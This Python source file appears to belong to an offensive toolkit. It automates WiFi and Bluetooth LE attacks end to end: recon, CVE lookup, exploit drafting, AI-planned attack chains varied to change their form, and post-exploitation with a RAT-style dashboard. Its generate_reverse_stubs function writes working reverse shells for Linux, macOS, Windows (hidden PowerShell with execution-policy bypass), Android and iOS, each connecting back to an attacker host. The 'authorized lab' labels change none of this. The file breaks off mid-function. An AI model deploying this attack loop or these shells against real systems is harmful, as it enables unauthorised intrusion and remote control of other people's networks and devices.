#!/usr/bin/env python3
"""Target-adaptive engagement loop (WiFi + BLE).

Operator flow implemented here:

  select target
    → recon (live)
    → CVE lookup (NVD)
    → optional CVE→code / exploit draft for deeper recon
    → sufficiency gate
    → attack chain planning (AI + heuristic, target-adaptive)
    → polymorphism on the plan
    → walk with live re-planning until access or bound
    → auto post-exploitation on foothold
    → open flash RAT-like post-access dashboard
    → dynamic capability menu from gained state
    → polymorphic reverse-connect stubs (win/linux/macos/android/ios)
    → outer cycle loops until access is granted (bounded)

All offensive steps stay behind the orchestrator's ACCEPT/CANCEL gate.
Nothing is fabricated: empty recon / missing NVD key / missing tools
produce honest errors and adaptive re-planning.
"""
from __future__ import annotations

import copy
import logging
import os
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# Outer engagement cycles (each cycle re-runs recon→plan→attack).
# Bounded so the loop cannot run forever if access is never achieved.
MAX_ENGAGEMENT_CYCLES = 12
# Minimum recon score (0–100) before the attack planner is trusted.
DEFAULT_RECON_THRESHOLD = 35
# Top CVEs to optionally feed into cve_to_exploit for extra recon.
MAX_CVE_CODE = 2


EmitFn = Callable[[str], None]


def _emit(on_event: Optional[EmitFn], msg: str) -> None:
    try:
        if on_event:
            on_event(msg)
    except Exception:  # noqa: BLE001
        pass
    logger.info(msg)


def _safe_dict(x: Any) -> Dict[str, Any]:
    return x if isinstance(x, dict) else {}


# ---------------------------------------------------------------------------
# Recon sufficiency scoring (target-adaptive)
# ---------------------------------------------------------------------------
def score_recon(domain: str, seed: Dict[str, Any]) -> Dict[str, Any]:
    """Score how much live recon we have (0–100). Never invents data."""
    score = 0
    reasons: List[str] = []
    recon = _safe_dict(seed.get("recon"))
    cves = seed.get("cves") or []
    kb = seed.get("kb_hits") or []

    if domain == "wifi":
        if seed.get("bssid"):
            score += 10
            reasons.append("bssid")
        if seed.get("ssid") or seed.get("essid"):
            score += 5
            reasons.append("ssid")
        if seed.get("channel") not in (None, "", 0, "0"):
            score += 5
            reasons.append("channel")
        enc = (seed.get("encryption") or seed.get("enc") or "").lower()
        if enc:
            score += 10
            reasons.append(f"enc={enc}")
        # Catalog recon sections
        for key, pts in (
            ("wps", 8),
            ("clients", 10),
            ("cves", 15),
            ("kb_hits", 8),
            ("handshake_harvest", 12),
            ("eapol_monitor", 10),
            ("probe_profile", 5),
            ("beacon_parse", 5),
            ("signal_map", 4),
            ("channel_plan", 3),
        ):
            sec = _safe_dict(recon.get(key))
            if sec.get("ok") or _safe_dict(sec.get("data")):
                score += pts
                reasons.append(key)
        if seed.get("cap_file") or seed.get("pcap"):
            score += 12
            reasons.append("pcap")
        if seed.get("wordlist") or seed.get("weakpass"):
            score += 5
            reasons.append("wordlist")
    else:  # ble
        if seed.get("address") or seed.get("addr") or seed.get("mac"):
            score += 15
            reasons.append("address")
        if seed.get("name") or seed.get("local_name"):
            score += 5
            reasons.append("name")
        if seed.get("rssi") is not None:
            score += 5
            reasons.append("rssi")
        services = seed.get("services") or seed.get("uuids") or []
        if services:
            score += 15
            reasons.append(f"services={len(services)}")
        ble_recon = _safe_dict(seed.get("ble_recon") or recon)
        for key, pts in (
            ("gatt_map", 15),
            ("manufacturer", 8),
            ("pairing_risk", 10),
            ("appearance", 5),
            ("mesh", 8),
            ("probes", 10),
        ):
            sec = ble_recon.get(key)
            if sec:
                score += pts
                reasons.append(key)

    if cves:
        score += min(20, 5 * len(cves))
        reasons.append(f"cves={len(cves)}")
    if kb:
        score += min(10, 2 * len(kb))
        reasons.append(f"kb={len(kb)}")

    score = max(0, min(100, score))
    return {
        "score": score,
        "reasons": reasons,
        "enough": score >= int(
            seed.get("recon_threshold") or DEFAULT_RECON_THRESHOLD
        ),
    }


# ---------------------------------------------------------------------------
# Polymorphism on plan steps (live-time variation)
# ---------------------------------------------------------------------------
def _poly_mutate_steps(
    steps: List[Dict[str, Any]],
    seed: Dict[str, Any],
    domain: str,
    cycle: int,
) -> List[Dict[str, Any]]:
    """Return a polymorphic, target-adaptive variant of the planned chain.

    Does not invent tools — only reorders optional branches, injects
    poly_adapt markers, and varies args using target encryption /
    services. Cycle index drives deterministic variation.

    When a step is ``poly_adapt`` / grammar / picker, merges live seed
    features and optionally pre-resolves a scored primary via
    :func:`run_poly_adapt` so the walk already carries a target-ranked
    pick.
    """
    if not steps:
        return steps

    # Shared feature bag once per mutation pass
    try:
        from core.utils.poly_adapt import extract_target_features
        feats = extract_target_features(seed if isinstance(seed, dict) else {})
    except Exception:  # noqa: BLE001
        feats = {}
    enc = (feats.get("encryption") or seed.get("encryption")
           or seed.get("enc") or "").lower()

    out: List[Dict[str, Any]] = []
    for idx, raw in enumerate(steps):
        s = copy.deepcopy(raw) if isinstance(raw, dict) else {"action": str(raw)}
        args = dict(s.get("args") or s.get("params") or {})
        action = (s.get("action") or "").lower()
        method = (s.get("method") or args.get("method") or s.get("name") or "").lower()

        # Target-adaptive arg injection from seed + features
        if domain == "wifi":
            for k in ("bssid", "ssid", "channel", "interface", "cap_file",
                      "pcap", "wordlist", "encryption", "enc", "client_count",
                      "pmf_supported", "pmf", "wpa_version", "chipset"):
                src = seed.get(k) if seed.get(k) not in (None, "", [], {}) else feats.get(k)
                if src not in (None, "", [], {}) and k not in args:
                    args[k] = src
            clients = seed.get("clients")
            if isinstance(clients, list) and "client_count" not in args:
                args["client_count"] = len(clients)
            if "wpa3" in enc or "sae" in enc:
                args.setdefault("prefer_sae", True)
                args.setdefault("wpa_version", feats.get("wpa_version") or "wpa3")
            if cycle % 2 == 1 and action in ("wifi_attack", "crack", "pmkid"):
                args["poly_variant"] = f"c{cycle}_i{idx}"
        else:
            addr = seed.get("address") or seed.get("addr") or seed.get("mac")
            if addr and "addr" not in args and "address" not in args:
                args["addr"] = addr
                args["address"] = addr
            if seed.get("adapter") and "adapter" not in args:
                args["adapter"] = seed["adapter"]
            if cycle % 2 == 1 and action in ("ble_attack", "ble_probe"):
                args["poly_variant"] = f"c{cycle}_i{idx}"

        # Pre-resolve poly_adapt companions with scored primary
        is_poly_step = (
            action in ("poly_adapt", "polymorphic", "target_adaptive")
            or method.startswith("poly_")
            or method.startswith("adapt_")
        )
        poly_meta: Dict[str, Any] = {
            "cycle": cycle,
            "index": idx,
            "target_adaptive": True,
            "enc": enc or None,
            "method": method or None,
            "wpa_version": feats.get("wpa_version"),
            "pmf_supported": feats.get("pmf_supported"),
            "client_count": feats.get("client_count"),
        }
        if is_poly_step and method:
            try:
                from core.refactors.poly_adapt_companions import run_poly_adapt
                resolved = run_poly_adapt(method, args)
                if isinstance(resolved, dict) and resolved.get("ok"):
                    data = resolved.get("data") or {}
                    poly_meta["resolved_pick"] = (
                        data.get("primary") or data.get("pick") or data.get("picked")
                    )
                    poly_meta["resolved_score"] = (
                        data.get("picked_score") or data.get("score")
                    )
                    args.setdefault("resolved_pick", poly_meta["resolved_pick"])
            except Exception:  # noqa: BLE001
                pass

        s["poly"] = poly_meta
        s["args"] = args
        out.append(s)

    # Target-adaptive reorder: for WPA3 prefer SAE-related steps earlier;
    # for clientless PMKID, pull pmkid steps forward.
    if len(out) > 3:
        wv = feats.get("wpa_version") or ""
        clients = int(feats.get("client_count") or 0)

        def _priority(step: Dict[str, Any]) -> int:
            blob = json_action_blob(step)
            p = 0
            if wv == "wpa3" and ("sae" in blob or "wpa3" in blob):
                p -= 2
            if clients == 0 and "pmkid" in blob:
                p -= 2
            if feats.get("wps") and "wps" in blob:
                p -= 1
            if wv == "wpa2_enterprise" and ("eap" in blob or "enterprise" in blob):
                p -= 2
            return p

        head = out[:1]
        mid = sorted(out[1:], key=_priority)
        out = head + mid

    # On cycle % 3 == 2, reverse non-critical mid block (existing behaviour)
    if cycle % 3 == 2 and len(out) > 4:
        head, mid, tail = out[:1], out[1:-1], out[-1:]
        mid = mid[::-1]
        out = head + mid + tail
    return out


def json_action_blob(step: Dict[str, Any]) -> str:
    """Lowercased action/method/tool string for reorder heuristics."""
    parts = [
        step.get("action"),
        step.get("method"),
        step.get("tool"),
        step.get("name"),
        (step.get("args") or {}).get("method"),
    ]
    return " ".join(str(p or "") for p in parts).lower()


# ---------------------------------------------------------------------------
# Reverse-connect payload stubs (authorized lab use)
# ---------------------------------------------------------------------------
def generate_reverse_stubs(
    attacker_host: str,
    attacker_port: int = 4444,
    out_dir: Optional[Path] = None,
) -> Dict[str, Any]:
    """Write polymorphic reverse-connect *stubs* for common OS targets.

    These are intentionally simple connect-back templates for authorized
    lab post-exploitation planning. They are NOT auto-executed. Returns
    paths + metadata. Honest: empty host → ok=False.
    """
    host = (attacker_host or "").strip()
    if not host:
        return {"ok": False, "error": "attacker_host required", "files": {}}

    root = Path(out_dir or Path("output") / "reverse_stubs")
    root.mkdir(parents=True, exist_ok=True)
    ts = int(time.time())
    # Tiny poly: vary comment banner + port encoding so two generations differ.
    banner = f"KFIOSA lab stub ts={ts} poly={ts % 97}"

    stubs = {
        "linux": f"""#!/bin/sh
# {banner} — AUTHORIZED LAB ONLY
# reverse TCP connect-back to operator host
HOST="{host}"
PORT={int(attacker_port)}
if command -v bash >/dev/null 2>&1; then
  bash -c "bash -i >& /dev/tcp/$HOST/$PORT 0>&1" 2>/dev/null || true
fi
# fallback: nc
if command -v nc >/dev/null 2>&1; then
  nc "$HOST" "$PORT" -e /bin/sh 2>/dev/null || \
    rm -f /tmp/.kfs; mkfifo /tmp/.kfs; cat /tmp/.kfs | /bin/sh -i 2>&1 | nc "$HOST" "$PORT" > /tmp/.kfs
fi
""",
        "macos": f"""#!/bin/bash
# {banner} — AUTHORIZED LAB ONLY
HOST="{host}"
PORT={int(attacker_port)}
# /dev/tcp is bash-only on many macOS installs
bash -c "bash -i >& /dev/tcp/$HOST/$PORT 0>&1" 2>/dev/null || \\
  python3 -c "import socket,os,pty,sys;s=socket.socket();s.connect(('{host}',{int(attacker_port)}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/zsh')"
""",
        "windows": f"""@echo off
REM {banner} — AUTHORIZED LAB ONLY
REM PowerShell reverse TCP (lab)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
  "$c=New-Object Net.Sockets.TCPClient('{host}',{int(attacker_port)});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}"
""",
        "android": f"""#!/system/bin/sh
# {banner} — AUTHORIZED LAB ONLY (rooted lab device / frida-assisted)
HOST="{host}"
PORT={int(attacker_port)}
# toybox nc / busybox
nc "$HOST" "$PORT" -e /system/bin/sh 2>/dev/null || \\
  /system/xbin/busybox nc "$HOST" "$PORT" -e /system/bin/sh
""",
        "ios": f"""#!/bin/sh
# {banner} — AUTHORIZED LAB ONLY (jailbroken lab device)
HOST="{host}"
PORT={int(attacker_port)}
# dropbear/ssh or bash if present on jailbreak toolchain
bash -c "bash -i >& /dev/tcp/$HOST/$PORT 0>&1" 2>/dev/null || \\
  nc "$HOST" "$PORT" -e /bin/sh
""",
        "0day_stub.md": f"""# 0-day / custom exploit stub — {banner}

Authorized lab template only. Wire a real PoC after CVE→code.

- LHOST: `{host}`
- LPORT: `{int(attacker_port)}`
- Stages: recon fingerprint → crash triage → controlled memory write →
  connect-back using OS-specific reverse stub in this directory.
- Do **not** deploy outside the engagement scope.

Platforms: windows | linux | macos | android | ios
""",
    }

    files: Dict[str, str] = {}
    for name, body in stubs.items():
        ext = "" if name.endswith(".md") else {
            "linux": ".sh", "macos": ".sh", "windows": ".bat",
            "android": ".sh", "ios": ".sh",
        }.get(name, ".txt")
        path = root / f"{name}_{ts}{ext}"
        path.write_text(body, encoding="utf-8")
        try:
            if ext == ".sh":
                path.chmod(0o755)
        except Exception:  # noqa: BLE001
            pass
        files[name] = str(path)

    return {
        "ok": True,
        "attacker_host": host,
        "attacker_port": int(attacker_port),
        "dir": str(root),
        "files": files,
        "poly_ts": ts,
        "note": "stubs written only; not executed",
    }


# ---------------------------------------------------------------------------
# Adaptive engagement controller
# ---------------------------------------------------------------------------
class AdaptiveEngagement:
    """Drive the full adaptive loop for ``domain`` in {wifi, ble}."""

    def __init__(
        self,
        orchestrator: Any,
        *,
        catalog_recon_factory: Optional[Callable[[Dict[str, Any]], Any]] = None,
        on_event: Optional[EmitFn] = None,
        max_cycles: int = MAX_ENGAGEMENT_CYCLES,
        recon_threshold: int = DEFAULT_RECON_THRESHOLD,
        attacker_host: Optional[str] = None,
        attacker_port: int = 4444,
        enable_cve_code: bool = True,
        enable_reverse_stubs: bool = True,
        until_access: bool = True,
    ) -> None:
        self.orch = orchestrator
        self.catalog_recon_factory = catalog_recon_factory
        self.on_event = on_event
        self.max_cycles = max(1, int(max_cycles))
        self.recon_threshold = int(recon_threshold)
        self.attacker_host = (
            attacker_host
            or os.environ.get("KFIOSA_LHOST")
            or os.environ.get("LHOST")
            or ""
        )
        self.attacker_port = int(
            attacker_port
            or os.environ.get("KFIOSA_LPORT")
            or os.environ.get("LPORT")
            or 4444
        )
        self.enable_cve_code = enable_cve_code
        self.enable_reverse_stubs = enable_reverse_stubs
        self.until_access = until_access

    # -- logging helper -------------------------------------------------
    def log(self, msg: str) -> None:
        _emit(self.on_event, msg)

    def _clear_leftover_auto_access(self) -> bool:
        """Clear TuiConfirmFn AUTO→access latch from a prior engagement.

        Mirrors :meth:`AutonomousOrchestrator.run` engagement-start clear.
        Returns True if a latch was cleared. Never raises.
        """
        try:
            from core.orchestrator.autonomous_orchestrator import (
                _confirm_owner,
            )
            orch = self.orch
            confirm_fn = getattr(orch, "confirm_fn", None) if orch is not None else None
            owner = _confirm_owner(confirm_fn)
            if owner is not None and hasattr(owner, "clear_auto"):
                if owner.clear_auto():
                    self.log(
                        "[i] cleared leftover AUTO→access from previous engagement"
                    )
                    return True
        except Exception:  # noqa: BLE001 — never block engagement start
            logger.debug("adaptive clear_auto failed", exc_info=True)
        return False

    # -- public entry ---------------------------------------------------
    def run(
        self,
        domain: str,
        seed: Dict[str, Any],
        *,
        autonomous: bool = False,
        attach_zero_day: Optional[bool] = None,
    ) -> Dict[str, Any]:
        domain = (domain or "wifi").lower().strip()
        if domain not in ("wifi", "ble"):
            return {
                "ok": False,
                "error": f"adaptive engagement supports wifi|ble, got {domain!r}",
            }
        seed = dict(seed or {})
        seed["recon_threshold"] = seed.get("recon_threshold", self.recon_threshold)
        seed["until_access"] = self.until_access
        seed["adaptive"] = True
        seed["domain"] = domain

        # Fresh engagement: drop leftover AUTO→access latch. The TUI path
        # uses AdaptiveEngagement.run (not AutonomousOrchestrator.run), so
        # without this clear a prior session's 'a' keystroke silently
        # auto-ACCEPTs every step of the next adaptive chain.
        self._clear_leftover_auto_access()

        report: Dict[str, Any] = {
            "ok": True,
            "domain": domain,
            "seed": seed,
            "cycles": [],
            "access": {"achieved": False, "creds": None, "session_id": None},
            "phases": [],
            "reverse_stubs": None,
            "rat": None,
            "started": time.time(),
        }

        self.log(
            f"[*] Adaptive engagement ({domain}) until_access={self.until_access} "
            f"max_cycles={self.max_cycles} target="
            f"{seed.get('ssid') or seed.get('name') or seed.get('bssid') or seed.get('address')}"
        )

        for cycle in range(1, self.max_cycles + 1):
            cyc: Dict[str, Any] = {
                "cycle": cycle,
                "phases": {},
                "access": False,
            }
            self.log(f"=== Adaptive cycle {cycle}/{self.max_cycles} ===")

            # 1) Recon
            recon_out = self._phase_recon(domain, seed)
            cyc["phases"]["recon"] = recon_out
            report["phases"].append({"cycle": cycle, "phase": "recon", **recon_out})

            # 2) NVD CVE lookup (enrich)
            cve_out = self._phase_cve_nvd(domain, seed)
            cyc["phases"]["cve"] = cve_out
            report["phases"].append({"cycle": cycle, "phase": "cve", **cve_out})

            # 3) Optional CVE→code for deeper recon data
            if self.enable_cve_code:
                code_out = self._phase_cve_code(seed)
                cyc["phases"]["cve_code"] = code_out
                report["phases"].append(
                    {"cycle": cycle, "phase": "cve_code", **code_out}
                )

            # 4) Sufficiency gate
            sufficiency = score_recon(domain, seed)
            cyc["phases"]["sufficiency"] = sufficiency
            self.log(
                f"[i] recon score={sufficiency['score']}/100 "
                f"enough={sufficiency['enough']} "
                f"({', '.join(sufficiency['reasons'][:8])})"
            )
            if not sufficiency["enough"] and cycle < self.max_cycles:
                # Deepen recon once more before attacking weakly
                self.log("[i] recon insufficient — deepening probes then continuing")
                deep = self._phase_recon(domain, seed, deep=True)
                cyc["phases"]["recon_deep"] = deep
                sufficiency = score_recon(domain, seed)
                cyc["phases"]["sufficiency_after_deep"] = sufficiency

            # 5–7) Plan → poly → attack walk (via orchestrator)
            attack_out = self._phase_attack(
                domain, seed, cycle=cycle,
                autonomous=autonomous,
                attach_zero_day=attach_zero_day,
            )
            cyc["phases"]["attack"] = {
                "access": attack_out.get("access"),
                "replans": attack_out.get("replans"),
                "executed": len(attack_out.get("executed") or []),
                "ai_chain_source": attack_out.get("ai_chain_source"),
            }
            cyc["orch_report"] = attack_out
            report["phases"].append({
                "cycle": cycle, "phase": "attack",
                "access": attack_out.get("access"),
                "replans": attack_out.get("replans"),
            })

            access = _safe_dict(attack_out.get("access"))
            if access.get("achieved"):
                report["access"] = access
                cyc["access"] = True
                self.log("[+] ACCESS ACHIEVED — post-exploit + RAT dashboard")

                # 8) Auto post-exploitation already inside orch hooks;
                # ensure gain hooks ran (orchestrator.run already did).
                # 9) RAT / flash dashboard
                rat = self._phase_rat(domain, seed, attack_out)
                cyc["phases"]["rat"] = rat
                report["rat"] = rat

                # 10) Reverse stubs for multi-OS connect-back
                if self.enable_reverse_stubs:
                    stubs = generate_reverse_stubs(
                        self.attacker_host or self._guess_lhost(),
                        self.attacker_port,
                    )
                    cyc["phases"]["reverse_stubs"] = stubs
                    report["reverse_stubs"] = stubs
                    if stubs.get("ok"):
                        self.log(
                            f"[+] reverse stubs → {stubs.get('dir')} "
                            f"({len(stubs.get('files') or {})} files)"
                        )
                    else:
                        self.log(
                            f"[i] reverse stubs skipped: {stubs.get('error')}"
                        )

                report["cycles"].append(cyc)
                break

            report["cycles"].append(cyc)
            if not self.until_access:
                self.log("[i] until_access=False — stopping after one cycle")
                break
            self.log(
                f"[i] no access in cycle {cycle}; "
                f"re-planning with live prior results"
            )
            # Feed prior executed into seed for next cycle's planner
            prior = attack_out.get("executed") or []
            seed["prior_results"] = prior
            seed["prior_cycles"] = cycle

        report["duration_s"] = round(time.time() - report["started"], 3)
        report["ok"] = True
        if not report["access"].get("achieved"):
            self.log(
                f"[!] Adaptive engagement finished without access "
                f"after {len(report['cycles'])} cycle(s)"
            )
        return report

    # -- phases ---------------------------------------------------------
    def _phase_recon(
        self, domain: str, seed: Dict[str, Any], *, deep: bool = False
    ) -> Dict[str, Any]:
        self.log(f"[*] Phase recon ({domain}{', deep' if deep else ''})")
        out: Dict[str, Any] = {"ok": False, "domain": domain}
        try:
            if domain == "wifi":
                out.update(self._recon_wifi(seed, deep=deep))
            else:
                out.update(self._recon_ble(seed, deep=deep))
        except Exception as e:  # noqa: BLE001
            out = {"ok": False, "error": str(e)}
            self.log(f"[!] recon failed: {e}")
        return out

    def _recon_wifi(self, seed: Dict[str, Any], *, deep: bool) -> Dict[str, Any]:
        if self.catalog_recon_factory is None:
            return {"ok": False, "error": "catalog_recon_factory not wired"}
        recon = self.catalog_recon_factory(seed)

        def _call_run():
            try:
                return recon.run(with_probes=True)
            except TypeError:
                return recon.run()

        report = _call_run()
        # Merge into seed (cycle-safe, no backrefs)
        self._merge_wifi_recon(seed, report)
        if deep and hasattr(recon, "run_probe"):
            for m in ("signal_map", "channel_plan", "beacon_parse"):
                try:
                    recon.run_probe(m)
                except Exception:  # noqa: BLE001
                    pass
            # Refresh merge after deep probes
            try:
                report = _call_run()
                self._merge_wifi_recon(seed, report)
            except Exception:  # noqa: BLE001
                pass
        return {"ok": True, "recon_keys": list(_safe_dict(report).keys())[:20]}

    def _merge_wifi_recon(self, seed: Dict[str, Any], recon_report: Any) -> None:
        if not isinstance(recon_report, dict):
            return
        try:
            seed["vendor"] = recon_report.get("vendor") or seed.get("vendor")
            cves_step = _safe_dict(recon_report.get("cves"))
            cves = _safe_dict(cves_step.get("data")).get("cves") or []
            if cves:
                seed["cves"] = cves
            kb_step = _safe_dict(recon_report.get("kb_hits"))
            hits = _safe_dict(kb_step.get("data")).get("hits") or []
            if hits:
                seed["kb_hits"] = hits
            attach = dict(recon_report)
            nested = attach.get("target")
            if nested is seed or (
                isinstance(nested, dict)
                and nested.get("bssid") == seed.get("bssid")
            ):
                attach["target"] = {
                    k: nested.get(k)
                    for k in (
                        "bssid", "ssid", "channel", "encryption", "enc",
                        "interface", "vendor",
                    )
                    if isinstance(nested, dict) and k in nested
                }
            seed["recon"] = attach
            for key in ("handshake_harvest", "eapol_monitor"):
                data = _safe_dict(_safe_dict(recon_report.get(key)).get("data"))
                pcap = data.get("pcap") or data.get("cap_file")
                if pcap:
                    seed.setdefault("cap_file", pcap)
                    seed.setdefault("pcap", pcap)
            wp = _safe_dict(_safe_dict(recon_report.get("weakpass")).get("data"))
            wl = wp.get("path") or wp.get("wordlist") or wp.get("file")
            if wl:
                seed.setdefault("wordlist", wl)
                seed.setdefault("weakpass", wl)
        except Exception as e:  # noqa: BLE001
            self.log(f"[i] recon-merge skipped: {e}")

    def _recon_ble(self, seed: Dict[str, Any], *, deep: bool) -> Dict[str, Any]:
        # Prefer injected catalog recon (unit tests / dashboard factory) so we
        # never hang on live BLE GATT against a fake MAC.
        if self.catalog_recon_factory is not None:
            try:
                recon = self.catalog_recon_factory(seed)
                if hasattr(recon, "run"):
                    try:
                        report = recon.run(with_probes=True)
                    except TypeError:
                        report = recon.run()
                    if isinstance(report, dict):
                        seed["ble_recon"] = report
                        seed["recon"] = report
                        # Lift common fields
                        for k in ("services", "uuids", "manufacturer", "name"):
                            if report.get(k) and not seed.get(k):
                                seed[k] = report[k]
                        return {
                            "ok": True,
                            "recon_keys": list(report.keys())[:20],
                            "via": "catalog_recon_factory",
                        }
            except Exception as e:  # noqa: BLE001
                self.log(f"[i] ble catalog recon failed: {e}")

        # Hermetic / smoke: seed-only recon (no live BLE radio work).
        if (
            os.environ.get("KFIOSA_SMOKE", "").strip() in ("1", "true", "yes")
            or os.environ.get("KFIOSA_SKIP_BLE_RECON", "").strip()
            in ("1", "true", "yes")
            or (
                os.environ.get("KFIOSA_MCP_AUTOSTART", "1").strip() == "0"
                and not os.environ.get("KFIOSA_FORCE_BLE_RECON")
            )
        ):
            results = {
                "seed_only": {
                    "ok": True,
                    "data": {
                        "address": seed.get("address") or seed.get("addr"),
                        "name": seed.get("name"),
                        "rssi": seed.get("rssi"),
                        "services": seed.get("services") or [],
                    },
                }
            }
            seed["ble_recon"] = results
            seed["recon"] = results
            return {
                "ok": True,
                "probes_ok": 1,
                "probes": ["seed_only"],
                "via": "seed_only",
            }

        try:
            from core.ble.runner import run_probe
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "error": f"ble runner import: {e}"}

        adapter = seed.get("adapter") or seed.get("hci") or "hci0"
        addr = seed.get("address") or seed.get("addr") or seed.get("mac")
        args = {"adapter": adapter, "addr": addr, "address": addr}
        methods = [
            "parse_advertising_data",
            "manufacturer_oracle",
            "map_gatt_services",
            "predict_pairing_vulnerability",
            "assess_mitm_feasibility",
            "calculate_exfil_potential",
        ]
        if deep:
            methods.extend([
                "hid_recon",
                "smarthome_enumerator",
                "connection_graph_active",
                "recon_ota_update",
                "firmware_version_predictor",
                "tracking_resistance_test",
            ])
        results: Dict[str, Any] = {}
        for m in methods:
            try:
                r = run_probe(m, adapter=adapter, args=args)
                results[m] = r
                data = _safe_dict(_safe_dict(r).get("data"))
                if data.get("services"):
                    seed["services"] = data["services"]
                if data.get("uuids"):
                    seed["uuids"] = data["uuids"]
                if data.get("manufacturer"):
                    seed["manufacturer"] = data["manufacturer"]
                if data.get("gatt_map") or data.get("characteristics"):
                    seed.setdefault("gatt", data)
            except Exception as e:  # noqa: BLE001
                results[m] = {"ok": False, "error": str(e)}
        seed["ble_recon"] = results
        seed["recon"] = results
        ok_n = sum(1 for r in results.values() if _safe_dict(r).get("ok"))
        return {"ok": ok_n > 0, "probes_ok": ok_n, "probes": list(results.keys())}

    def _phase_cve_nvd(self, domain: str, seed: Dict[str, Any]) -> Dict[str, Any]:
        self.log("[*] Phase CVE lookup (NVD)")
        keywords = self._cve_keywords(domain, seed)
        if not keywords:
            return {"ok": False, "error": "no keywords for NVD", "cves": seed.get("cves") or []}

        existing = list(seed.get("cves") or [])
        found: List[Dict[str, Any]] = list(existing)
        errors: List[str] = []

        # Prefer catalog recon CVE data already present; still refresh via NVD
        try:
            from core.ai_backend import get_nvd_key
            nvd_key = get_nvd_key()
        except Exception:  # noqa: BLE001
            nvd_key = os.environ.get("NVD_API_KEY", "")

        if os.environ.get("KFIOSA_SKIP_NVD", "").strip() in ("1", "true", "yes"):
            self.log("[i] KFIOSA_SKIP_NVD set — keeping recon CVEs only")
            seed["cves"] = found
            return {
                "ok": bool(found),
                "count": len(found),
                "keywords": keywords[:5],
                "errors": [],
                "skipped": "KFIOSA_SKIP_NVD",
            }

        # Hermetic / no-key: use offline knowledge only (CVELookup falls
        # back after APIs fail). Bound wall-clock so adaptive never hangs
        # the TUI or unit tests after a scan.
        hermetic = (
            not (nvd_key or "").strip()
            and not os.environ.get("KFIOSA_FORCE_NVD")
        )
        nvd_budget_s = 6 if hermetic else 20

        try:
            from core.modules.cve_lookup import CVELookup
            import asyncio

            lookup = CVELookup({"nvd_api_key": nvd_key or ""})

            async def _search_all() -> List[Dict[str, Any]]:
                acc: List[Dict[str, Any]] = []
                # Cap keywords — each can hit multiple APIs.
                for kw in keywords[:2 if hermetic else 3]:
                    try:
                        data = await asyncio.wait_for(
                            lookup.search_cves(kw, limit=5),
                            timeout=4 if hermetic else 6,
                        )
                        vulns = data.get("vulnerabilities") or []
                        for v in vulns:
                            if isinstance(v, dict):
                                acc.append(v)
                    except Exception as e:  # noqa: BLE001
                        errors.append(f"{kw}: {e}")
                try:
                    await lookup.close()
                except Exception:  # noqa: BLE001
                    pass
                return acc

            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    import concurrent.futures
                    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
                        vulns = pool.submit(lambda: asyncio.run(_search_all())).result(
                            timeout=nvd_budget_s
                        )
                else:
                    vulns = loop.run_until_complete(
                        asyncio.wait_for(_search_all(), timeout=nvd_budget_s)
                    )
            except RuntimeError:
                vulns = asyncio.run(
                    asyncio.wait_for(_search_all(), timeout=nvd_budget_s)
                )
            except Exception as e:  # noqa: BLE001 — budget exceeded etc.
                vulns = []
                errors.append(f"nvd budget: {e}")
                self.log(f"[i] NVD lookup timed out / failed: {e}")

            # Dedup by id
            seen = {v.get("id") for v in found if isinstance(v, dict)}
            for v in vulns:
                vid = v.get("id")
                if vid and vid not in seen:
                    seen.add(vid)
                    found.append(v)
        except Exception as e:  # noqa: BLE001
            errors.append(str(e))
            self.log(f"[!] NVD lookup error: {e}")

        seed["cves"] = found
        self.log(f"[i] CVE pool size={len(found)} keywords={keywords[:5]}")
        return {
            "ok": bool(found) or not errors,
            "count": len(found),
            "keywords": keywords[:5],
            "errors": errors[:5],
        }

    def _cve_keywords(self, domain: str, seed: Dict[str, Any]) -> List[str]:
        kws: List[str] = []
        if domain == "wifi":
            for k in (
                seed.get("vendor"),
                seed.get("ssid"),
                seed.get("encryption") or seed.get("enc"),
                "WPA2",
                "802.11",
            ):
                if k and str(k) not in kws:
                    kws.append(str(k))
            recon = _safe_dict(seed.get("recon"))
            for sec in recon.values():
                if not isinstance(sec, dict):
                    continue
                data = sec.get("data") if isinstance(sec.get("data"), dict) else {}
                for key in ("vendor", "chipset", "model", "device_name"):
                    v = data.get(key)
                    if v and str(v) not in kws:
                        kws.append(str(v))
        else:
            for k in (
                seed.get("name"),
                seed.get("manufacturer"),
                seed.get("vendor"),
                "Bluetooth",
                "BLE GATT",
            ):
                if k and str(k) not in kws:
                    kws.append(str(k))
        return [k for k in kws if k and k.lower() not in ("unknown", "none", "n/a")]

    def _phase_cve_code(self, seed: Dict[str, Any]) -> Dict[str, Any]:
        """Optional: generate exploit-oriented code drafts for top CVEs."""
        cves = [
            c for c in (seed.get("cves") or [])
            if isinstance(c, dict) and c.get("id")
        ]
        if not cves:
            return {"ok": False, "error": "no CVEs to code", "drafts": []}
        if self.orch is None:
            return {"ok": False, "error": "no orchestrator", "drafts": []}

        drafts: List[Dict[str, Any]] = []
        for cve in cves[:MAX_CVE_CODE]:
            cve_id = cve.get("id")
            step = {"action": "cve_to_exploit", "args": {"cve_id": cve_id}}
            report: Dict[str, Any] = {
                "executed": [], "skipped": [],
                "access": {"achieved": False},
            }
            try:
                self.orch._dispatch_cve_to_exploit(step, seed, report)  # noqa: SLF001
                drafts.append({
                    "cve_id": cve_id,
                    "executed": report.get("executed"),
                    "skipped": report.get("skipped"),
                })
                # Attach any resulting paths into seed recon context
                for ent in report.get("executed") or []:
                    res = _safe_dict(ent.get("result"))
                    data = _safe_dict(res.get("data"))
                    if data:
                        seed.setdefault("cve_code_drafts", []).append({
                            "cve_id": cve_id, "data": data,
                        })
            except Exception as e:  # noqa: BLE001
                drafts.append({"cve_id": cve_id, "error": str(e)})
                self.log(f"[i] cve_to_exploit {cve_id}: {e}")
        return {"ok": True, "drafts": drafts, "count": len(drafts)}

    def _phase_attack(
        self,
        domain: str,
        seed: Dict[str, Any],
        *,
        cycle: int,
        autonomous: bool,
